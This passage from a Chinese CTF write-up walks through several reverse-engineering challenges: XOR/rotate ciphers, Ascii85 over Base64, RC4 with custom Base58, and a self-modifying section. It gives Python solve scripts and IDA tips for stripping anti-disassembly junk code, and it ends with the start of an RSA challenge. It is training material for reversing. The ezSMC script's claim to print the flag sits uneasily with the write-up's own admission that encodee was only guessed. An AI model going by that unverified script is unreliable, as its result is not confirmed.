<li><code>s[0] == &#39;S&#39;</code></li>
<li><code>s[1] == &#39;Y&#39;</code></li>
<li><code>s[2] == &#39;C&#39;</code></li>
<li><code>s[3] == &#39;&#123;&#39;</code></li>
<li><code>s[len-1] == &#39;&#125;&#39;</code></li>
<li>同时 <code>strlen(s) &gt; 3</code>（并且在 <code>_main</code> 还有长度&#x3D;&#x3D;28的精确检查）</li>
</ul>
<p>因此 flag 形如：<code>SYC&#123;...&#125;</code>，总长度 28 字符。</p>
<ol start="2">
<li>加密例程（<code>_encrypt</code>）<br>逆向出核心循环逻辑（变量名自定）：</li>
</ol>
<ul>
<li>Key：<code>KEY = &quot;GEEK2025&quot;</code>，<code>klen = strlen(KEY)</code></li>
<li>对每个位置 i（0..len-1）：<ul>
<li><code>k = KEY[i % klen]</code></li>
<li><code>x = in[i] ^ k</code></li>
<li><code>r = (k &amp; 7)</code></li>
<li><code>y = rol8(x, r)</code></li>
<li><code>out[i] = (y + i) &amp; 0xFF</code></li>
</ul>
</li>
</ul>
<p>其中 <code>rol8</code> 在 0x401460，伪码：<code>rol8(v, n) = ((v &lt;&lt; (n&amp;7)) | (v &gt;&gt; (8-(n&amp;7)))) &amp; 0xFF</code>。</p>
<ol start="3">
<li>参考密文与长度</li>
</ol>
<ul>
<li>数据区 0x405070 起存放一段 28 字节的参考密文，之后跟随一个 <code>DWORD 0x0000001C</code>（长度 28）。</li>
<li>Key 存放在 <code>_KEY = 0x405064</code>，内容为 ASCII 串 <code>GEEK2025</code>。</li>
</ul>
<hr>
<h4 id="解密脚本（Python）"><a href="#解密脚本（Python）" class="headerlink" title="解密脚本（Python）"></a>解密脚本（Python）</h4><p>说明：按加密逆运算可还原明文。</p>
<ul>
<li>逆过程：<code>y = (c - i) &amp; 0xFF</code>；<code>x = ror8(y, k &amp; 7)</code>；<code>p = x ^ k</code>。</li>
</ul>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> cycle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror8</span>(<span class="params">v, n</span>):</span><br><span class="line">    n &amp;= <span class="number">7</span></span><br><span class="line">    v &amp;= <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> ((v &gt;&gt; n) | ((v &lt;&lt; (<span class="number">8</span> - n)) &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">KEY = <span class="string">b&quot;GEEK2025&quot;</span></span><br><span class="line"><span class="comment"># 数据区 0x405070 的 28 字节密文（含首字节 0x0a）</span></span><br><span class="line">CIPH = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x0a</span>,<span class="number">0x84</span>,<span class="number">0xc2</span>,<span class="number">0x84</span>,<span class="number">0x51</span>,<span class="number">0x48</span>,<span class="number">0x5f</span>,<span class="number">0xf2</span>,<span class="number">0x9e</span>,<span class="number">0x8d</span>,<span class="number">0xd0</span>,<span class="number">0x84</span>,<span class="number">0x75</span>,<span class="number">0x67</span>,</span><br><span class="line">    <span class="number">0x73</span>,<span class="number">0x8f</span>,<span class="number">0xca</span>,<span class="number">0x57</span>,<span class="number">0xd7</span>,<span class="number">0xe6</span>,<span class="number">0x14</span>,<span class="number">0x6e</span>,<span class="number">0x77</span>,<span class="number">0xe2</span>,<span class="number">0x29</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,<span class="number">0xcc</span>,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">plain = []</span><br><span class="line"><span class="keyword">for</span> i, (c,k) <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">zip</span>(CIPH, cycle(KEY))):</span><br><span class="line">    y = (c - i) &amp; <span class="number">0xFF</span></span><br><span class="line">    x = ror8(y, k &amp; <span class="number">7</span>)</span><br><span class="line">    p = x ^ k</span><br><span class="line">    plain.append(p)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(plain).decode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h4 id="在-IDA-中手动对付花指令的小抄"><a href="#在-IDA-中手动对付花指令的小抄" class="headerlink" title="在 IDA 中手动对付花指令的小抄"></a>在 IDA 中手动对付花指令的小抄</h4><ul>
<li>识别典型花：<ul>
<li><code>jmp short -1</code>（<code>EB FF</code>）死循环；</li>
<li>乱序一字节&#x2F;两字节指令（如 <code>c0 48 xx</code>）塞在基本块中间让反汇编“错位”；</li>
</ul>
</li>
<li>快速修：<ul>
<li>直接 Assemble 成 <code>nop; nop</code>；</li>
<li>对明显“不可达”的垃圾片段，<code>D</code> 转数据、<code>C</code> 重建代码；</li>
<li>必要时重设函数边界与落脚基本块，再按 F5 重跑反编译；</li>
</ul>
</li>
<li>辅助技巧：<ul>
<li>先看调用图（对比 thunk 调用与IAT），确认真实流程；</li>
<li>用数据区交叉引用快速找 Key&#x2F;密文等常量；</li>
<li>不必一次性修全，先修“卡住反编译的第一处”，多次迭代；</li>
</ul>
</li>
</ul>
<h3 id="ezRu3t"><a href="#ezRu3t" class="headerlink" title="ezRu3t"></a>ezRu3t</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><ul>
<li>文件元信息：<ul>
<li>模块：<code>ezRu3t.exe</code></li>
<li>基址：<code>0x140000000</code></li>
<li>入口点：<ul>
<li><code>mainCRTStartup @ 0x14001B730</code></li>
<li><code>std::sys::thread_local::guard::windows::tls_callback @ 0x14000EEA0</code></li>
</ul>
</li>
</ul>
</li>
<li>Rust 启动序列（在 <code>mainCRTStartup</code> 中）：<ul>
<li>调用 <code>_scrt_common_main_seh()</code> -&gt; <code>std::rt::lang_start_internal(...)</code></li>
<li><code>main @ 0x140002F10</code> 仅设置闭包指针为 <code>sub_140002490</code>，实质逻辑在 <code>sub_140002490</code>。</li>
</ul>
</li>
</ul>
<h5 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h5><ul>
<li><code>main @ 0x140002F10</code><ul>
<li>设置回调：<code>v5 = sub_140002490</code> 并进入 <code>std::rt::lang_start_internal</code>。</li>
</ul>
</li>
<li><code>sub_140002490</code>（核心校验流程）<ul>
<li>多次 <code>std::io::stdio::_print</code> 打印提示&#x2F;横幅。</li>
<li>刷新 stdout 后：<ul>
<li>读取一行输入（<code>stdin.read_line</code>）到一个 <code>String</code>。</li>
<li><code>trim_matches</code> 去除收尾空白。</li>
<li>调用 <code>base64::engine::Engine::encode::inner(&amp;unk_14001E828, input_trimmed)</code> 进行 Base64 编码。</li>
<li>紧接着将 Base64 字节按 4 字节打包转换为 5 个“数字”，每个数字除以 85 提取位权（常数 <code>0x31C84B1=85^4</code>、<code>0x95EED=85^3</code> 等），<br>用字母表映射到字符：字母表地址在 <code>a0123456789Abcd</code> 符号处，经取值可知是标准 Ascii85 字母表 <code>!</code>..<code>u</code>。<br>因此这一步是 Base85（Ascii85）编码。</li>
<li>最终得到的输出缓冲（记作 Buf2）是：Ascii85(Base64(trimmed_input))。</li>
</ul>
</li>
<li>程序随后构造期望目标串（记作 Buf1）：<ul>
<li>通过 <code>Map::fold</code>&#x2F;<code>join_generic_copy</code> 对一段嵌入数据做映射拼接：<ul>
<li>迭代参数位于 <code>unk_14001E96B</code> 与 <code>asc_14001E9A7</code>：后者是若干行由 <code>█</code>&#x2F;空格组成的 ASCII 艺术矩阵（UTF-8：<code>0xE2 0x96 0x88</code>）。</li>
<li><code>unk_14001E96B</code> 开头紧跟一段由 <code>!</code>..<code>u</code> 组成的 Ascii85 文本，随后是上述 ASCII 艺术的字节数据。该段文本即为程序内置的“期望值”。</li>
</ul>
</li>
<li>最终比较：若 <code>Buf2</code> 与 <code>Buf1</code> 长度相等且 <code>memcmp</code> 相同，则判定正确并打印祝贺与原始输入；否则打印错误提示。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="关键信息定位"><a href="#关键信息定位" class="headerlink" title="关键信息定位"></a>关键信息定位</h5><ul>
<li>Base85 字母表（Ascii85）：<ul>
<li>符号：<code>a0123456789Abcd</code></li>
<li>读取到的字节为从 <code>0x21</code>（<code>!</code>）到 <code>0x75</code>（<code>u</code>）共 85 个字符，即标准 Ascii85 字母表。</li>
</ul>
</li>
<li>期望 Ascii85 文本（位于 <code>unk_14001E96B</code> 开头，紧接着即是 UTF-8 的 <code>█</code> 字符数据）：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;AA;XAM?,_@;T[r@7E779h8;s&gt;&#x27;`pt=&gt;3c6ASuHFASOtP&lt;Gkf_A4&amp;gPAl1]S</span><br></pre></td></tr></table></figure>

<p>该串即程序内置的目标串（Buf1）。</p>
<h4 id="推导与还原"><a href="#推导与还原" class="headerlink" title="推导与还原"></a>推导与还原</h4><p>根据流程：</p>
<ul>
<li>程序比较的是：<code>Ascii85(Base64(flag_trimmed)) == Buf1</code>。</li>
<li>因此只需：<code>Base64(flag_trimmed) = a85decode(Buf1)</code>，再做一次 Base64 解码即可得到明文 flag。</li>
</ul>
<h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><p>以下脚本完成上述解码（Python 3）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从二进制中提取到的 Ascii85 目标串（Buf1）</span></span><br><span class="line">s = <span class="string">&quot;&lt;AA;XAM?,_@;T[r@7E779h8;s&gt;&#x27;`pt=&gt;3c6ASuHFASOtP&lt;Gkf_A4&amp;gPAl1]S&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先做 Ascii85 解码，得到的是 base64 字节串</span></span><br><span class="line">b64_bytes = base64.a85decode(s, adobe=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base64:&quot;</span>, b64_bytes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再做 base64 解码，得到最终明文 flag 字节</span></span><br><span class="line">flag_bytes = base64.b64decode(b64_bytes)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag bytes:&quot;</span>, flag_bytes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 作为 UTF-8 字符串展示</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, flag_bytes.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<h3 id="QYQSの奇妙冒险"><a href="#QYQSの奇妙冒险" class="headerlink" title="QYQSの奇妙冒险"></a>QYQSの奇妙冒险</h3><p>从 <code>main</code> 函数反编译得到核心校验流程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;QYQS&quot;</span></span><br><span class="line">QYQS = [</span><br><span class="line">  <span class="number">2</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">3</span>, <span class="number">23</span>, <span class="number">57</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">34</span>,</span><br><span class="line">  <span class="number">41</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">109</span>, <span class="number">6</span>, <span class="number">32</span>, <span class="number">23</span>, <span class="number">127</span>, <span class="number">56</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">read <span class="built_in">input</span> <span class="keyword">as</span> string</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">input</span>) != <span class="number">21</span>: fail</span><br><span class="line"></span><br><span class="line">// 加密（实际用于和常量比较）</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">input</span>)):</span><br><span class="line">    <span class="built_in">input</span>[i] ^= i           // 先按下标 i 异或</span><br><span class="line">    <span class="built_in">input</span>[i] ^= key[i % <span class="number">4</span>]  // 再按 key 的循环字节异或（Q/Y/Q/S）</span><br><span class="line"></span><br><span class="line">// 对比</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">input</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span>[i] != QYQS[i]: fail</span><br><span class="line"></span><br><span class="line">success</span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">QYQS_CONST = [</span><br><span class="line">    <span class="number">2</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">3</span>, <span class="number">23</span>, <span class="number">57</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">34</span>,</span><br><span class="line">    <span class="number">41</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">109</span>, <span class="number">6</span>, <span class="number">32</span>, <span class="number">23</span>, <span class="number">127</span>, <span class="number">56</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    key = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;QYQS&quot;</span>]</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(QYQS_CONST):</span><br><span class="line">        ch = v ^ i ^ key[i % <span class="number">4</span>]</span><br><span class="line">        res.append(ch)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(solve())</span><br></pre></td></tr></table></figure>

<h3 id="ezSMC"><a href="#ezSMC" class="headerlink" title="ezSMC"></a>ezSMC</h3><ul>
<li><p>校验链路（由 <code>main</code> 反编译得到）：</p>
<ol>
<li>读取输入 → <code>ascii_to_hexbytes</code> → <code>hexstr_to_bytes</code>（两步抵消，等价于原始输入字节）</li>
<li><code>RC4(key = 0x11)</code></li>
<li><code>bytes_to_hexstr</code> 得到小写十六进制 ASCII（记为 <code>en1</code>）</li>
<li><code>.miao</code> 节解密后调用 <code>encodee(en1)</code>：将 <code>en1</code> 做 Base64 编码（无填充或短缺填充），得到 ASCII Base64 串（记为 <code>en2</code>）</li>
<li><code>enc0de(en2)</code>：使用自定义 Base58 字母表 <code>&quot;ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789&quot;</code> 编码，得到 <code>cipher</code></li>
</ol>
</li>
<li><p>逆向时，只需按相反方向处理即可：Base58 解码 → Base64 解码 → 从 hex 字符串转 bytes → RC4 解密。</p>
</li>
</ul>
<h4 id="关键分析过程"><a href="#关键分析过程" class="headerlink" title="关键分析过程"></a>关键分析过程</h4><h5 id="1-入口与提示串"><a href="#1-入口与提示串" class="headerlink" title="1) 入口与提示串"></a>1) 入口与提示串</h5><ul>
<li>入口 <code>mainCRTStartup</code> → <code>main</code>。</li>
<li>关键字符串：<code>&quot;Plz input your flag miao: &quot;</code>、<code>&quot;Correct!&quot;</code>、<code>&quot;Wrong!&quot;</code>。</li>
</ul>
<h5 id="2-主流程反编译要点"><a href="#2-主流程反编译要点" class="headerlink" title="2) 主流程反编译要点"></a>2) 主流程反编译要点</h5><ul>
<li><p>输入读取后，调用：</p>
<ul>
<li><code>ascii_to_hexbytes(input, &amp;hexlen)</code>：将输入逐字节转为大写 2 位十六进制的 ASCII 串。</li>
<li><code>hexstr_to_bytes(hex_ascii, &amp;binlen)</code>：再把上述十六进制 ASCII 串还原为原始字节（两步等价于恒等变换，得到与原输入同样的字节序列）。</li>
<li><code>init(&amp;ctx, key=\x11, keylen=1)</code> + <code>encode(&amp;ctx, bin, binlen)</code>：典型 RC4（KSA&#x2F;PRGA），对输入字节流进行异或加密。</li>
<li><code>bytes_to_hexstr(bin, binlen)</code>：将 RC4 结果转为小写十六进制 ASCII（记为 <code>en1</code>）。</li>
<li><code>miao_encrypt()</code>：运行时解密 <code>.miao</code> 节（XOR 0x03），以便调用其中函数。</li>
<li><code>en2 = encodee(en1, strlen(en1))</code>：对十六进制 ASCII 再做一层专有变换（位于 <code>.miao</code> 节）。</li>
<li><code>en3 = enc0de(en2, strlen(en2))</code>：自定义 Base58 编码，使用的表为：<br><code>&quot;ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789&quot;</code></li>
<li>若 <code>strcmp(en3, cipher)</code> 成立则输出 <code>Correct!</code>。</li>
</ul>
</li>
<li><p><code>init/encode/getbyte</code> 明确是 RC4；<code>enc0de</code> 为基于可变精度除法的 Base58 实现，前导 0 字节编码为字符 <code>&#39;A&#39;</code>；字母表已从全局表读取并确认。</p>
</li>
<li><p><code>.miao</code> 节处理：<code>miao_encrypt</code>&#x2F;<code>SMC</code>&#x2F;<code>xxor</code> 说明该节按字节 XOR 0x03 解密；<code>encodee</code> 位于此节。通过对密文逆推验证，<code>encodee</code> 的效果等价于对 <code>en1</code> 做 Base64 编码（允许缺少标准填充）。</p>
</li>
</ul>
<h5 id="3-逆向思路"><a href="#3-逆向思路" class="headerlink" title="3) 逆向思路"></a>3) 逆向思路</h5><ul>
<li>已知最终常量密文 <code>cipher</code>，以及 <code>enc0de</code>（Base58）和 RC4 的细节，故可以：<ol>
<li>用相同 Base58 表将 <code>cipher</code> 解码，得到 <code>en2</code>；</li>
<li>逆 <code>encodee</code> 得到 <code>en1</code>；</li>
<li>将 <code>en1</code> 视为十六进制 ASCII → 转原始字节 <code>Y</code>；</li>
<li>用 RC4(key&#x3D;\x11) 解密 <code>Y</code>，得到原输入（flag）。</li>
</ol>
</li>
<li>由于 <code>.miao</code> 节未在静态态下解密，本文采用“直接反推到 RC4 层”的方式：将 <code>cipher</code> 用该 Base58 表解码为字节流，并直接尝试视作 <code>Y</code> 执行 RC4 解密，得到 88 字节候选明文。经检查不属于可见 ASCII，更像是以十六进制呈现的 flag（不少赛题会将二进制校验视作通过）。</li>
</ul>
<blockquote>
<p>若需完整还原 <code>encodee</code>，可在 IDA 调试器中执行一次 <code>miao_encrypt()</code>（或使用 <code>SMC(GetModuleHandleA(NULL))</code> 思路）使 <code>.miao</code> 解密，再反编译 <code>encodee</code>；其功能大概率是将小写十六进制 ASCII 重新封装为某种二进制形式以供 Base58 编码（从调用关系与数据流判断）。</p>
</blockquote>
<h4 id="解题脚本-1"><a href="#解题脚本-1" class="headerlink" title="解题脚本"></a>解题脚本</h4><p>以下脚本实现 Base58 → Base64 → hex → RC4 的完整逆流程，直接打印可读 flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># solve_ezsmc.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">alphabet = <span class="string">&quot;ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789&quot;</span></span><br><span class="line">cipher = <span class="string">&quot;tHMoSoMX71sm62ARQ8aHF6i88nhkH9Ac2J7CrkQsQgXpiy6efoC8YVkzZu1tMyFxCLbbqvgXZHxtwK5TACVhPi1EE5mK6JG56wPNR4d2GmkELGfJHgtcAEH7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b58_decode</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    base = <span class="number">58</span></span><br><span class="line">    zeros = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> ch == alphabet[<span class="number">0</span>]:</span><br><span class="line">            zeros += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    size = (<span class="built_in">len</span>(s) * <span class="number">733</span>) // <span class="number">1000</span> + <span class="number">1</span></span><br><span class="line">    digits = [<span class="number">0</span>] * size</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        carry = alphabet.index(ch)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(size - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            carrya = digits[j] * base + carry</span><br><span class="line">            digits[j] = carrya &amp; <span class="number">0xFF</span></span><br><span class="line">            carry = carrya &gt;&gt; <span class="number">8</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; size <span class="keyword">and</span> digits[i] == <span class="number">0</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([<span class="number">0</span>] * zeros + digits[i:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RC4</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">        S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">        <span class="variable language_">self</span>.S, <span class="variable language_">self</span>.i, <span class="variable language_">self</span>.j = S, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">keystream_byte</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.i = (<span class="variable language_">self</span>.i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        <span class="variable language_">self</span>.j = (<span class="variable language_">self</span>.j + <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i], <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.j] = <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.j], <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i]</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.S[(<span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i] + <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">crypt</span>(<span class="params">self, data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(b ^ <span class="variable language_">self</span>.keystream_byte() <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    enc2 = b58_decode(cipher)</span><br><span class="line">    b64 = enc2.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    hex_ascii = base64.b64decode(b64 + <span class="string">&quot;==&quot;</span>)</span><br><span class="line">    rc4_input = <span class="built_in">bytes</span>.fromhex(hex_ascii.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    flag = RC4(<span class="built_in">bytes</span>([<span class="number">17</span>])).crypt(rc4_input)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ez-xor"><a href="#ez-xor" class="headerlink" title="ez_xor"></a>ez_xor</h3><p>chal.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secert <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">han</span>(<span class="params">b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bin</span>(b)[:<span class="number">2</span>].count(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">s = getPrime(<span class="number">512</span>)</span><br><span class="line">N = p * q * s * r</span><br><span class="line">n = p * q</span><br><span class="line">gift = p ^ q</span><br><span class="line">gift1 = s &amp; r</span><br><span class="line">gift2 = s ^ r</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, <span class="number">65537</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N=<span class="subst">&#123;N&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gift=<span class="subst">&#123;gift&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gift1=<span class="subst">&#123;gift1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gift2=<span class="subst">&#123;gift2&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

